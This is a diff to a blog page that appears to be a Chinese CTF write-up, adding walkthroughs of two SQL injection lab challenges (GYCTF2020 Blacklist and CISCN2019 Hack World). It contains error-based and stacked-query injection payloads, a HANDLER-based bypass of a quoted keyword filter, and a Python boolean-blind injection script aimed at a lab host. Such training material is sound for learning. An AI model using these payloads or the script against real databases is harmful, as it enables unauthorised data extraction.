@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/150.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/151.png?raw=true">
 <meta property="article:published_time" content="2022-12-09T09:27:30.000Z">
-<meta property="article:modified_time" content="2022-12-09T09:02:56.608Z">
+<meta property="article:modified_time" content="2022-12-09T14:46:32.662Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/75.png?raw=true">
@@ -175,6 +175,8 @@
 <li><a href="#suctf-2019checkin">[SUCTF 2019]CheckIn</a></li>
 <li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84areuserialz">[网鼎杯 2020 青龙组]（AreUSerialz）</a></li>
 <li><a href="#gxyctf2019babyupload">[GXYCTF2019]BabyUpload</a></li>
+<li><a href="#gyctf2020blacklist">[GYCTF2020]Blacklist</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack-world">[CISCN2019 (华北赛区) Day2 Web1] Hack World</a></li>
 </ul>
 <!-- tocstop -->
 <span id="more"></span>  
@@ -891,6 +893,70 @@ mochu7=show_source(’/flag’)<br>
  源代码就有 flag<br>
  感觉应该收集积累一些 phpinfo 查看信息，还有 php 查看文件内容的函数</li>
 </ol>
+<h2><span id="gyctf2020blacklist"> [GYCTF2020]Blacklist</span></h2>
+<ol>
+<li>输入 1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>输入 1’</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>ok, 存在 SQL 注入，应该是字符型报错注入<br>
+ 3. 1’ or 1 = 1#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>显然不是我们想要的，报错注入语句来一下<br>
+ 4. 1’ and updatexml (1,concat (0x7e,(select database ()),0x7e),1) #</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>应该是对上面这些关键字做了过滤，select 绕过<br>
+我尝试了双写，大小写混杂，注释符绕过都不行，看来不能运用含有 select 的注入语句<br>
+ 5. 1’ and extractvalue (1,concat (0x7e,database (),0x7e)) #</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : XPATH syntax error: &#x27;~supersqli~&#x27;</span><br></pre></td></tr></table></figure>
+<p>也没发现想要的 flag 痕迹，想一想还有什么注入，堆叠注入？试一试<br>
+ 6. 堆叠注入</p>
+<ul>
+<li>1’;show databases;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>1’;show tables;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现可疑表 FlagHere</p>
+<ul>
+<li>1’;show columns from FlagHere;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可疑字段 flag，但是不能用 select 我不能获取里面的内容，查阅 wp, 发现一个新用法 HANDLER … OPEN</p>
+<ul>
+<li>HANDLER … OPEN</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER … OPEN语句打开一个表</span><br><span class="line">HANDLER … READ语句访问</span><br><span class="line">HANDLER … CLOSE关闭一个表</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</span><br></pre></td></tr></table></figure>
+<p>得到 flag</p>
+<h2><span id="ciscn2019-华北赛区-day2-web1-hack-world"> [CISCN2019 (华北赛区) Day2 Web1] Hack World</span></h2>
+<p>点开靶机进去，页面告诉我们 table 和 column 都是 flag<br>
+Now, just give the id of passage<br>
+ 浅浅怀疑是 sql 注入，id 应该是个参数</p>
+<ul>
+<li>get or post？<br>
+抓包发现是 post 型</li>
+<li>确定注入类型</li>
+</ul>
+<ol>
+<li>输入 1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, glzjin wants a girlfriend.</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>输入 f</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
+<p>应该是布尔盲注了<br>
+ 3. get flag<br>
+ 布尔盲注手工肯定不现实啦<br>
+那就浅浅写个脚本跑一跑嘛</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import  requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://a97966da-4466-48d1-b5fc-abb1a493628f.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    flag =&#x27;&#x27;</span><br><span class="line">    for i in range(1,50):</span><br><span class="line">        for j in range(32,140):</span><br><span class="line">            payload = &#x27;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,0)&#x27;.format(i,j)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;id&quot;: payload</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            if&#x27;Hello, glzjin wants a girlfriend&#x27; in res.text:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
+<p>ok, 成功拿取 flag</p>
 
       
     </div>
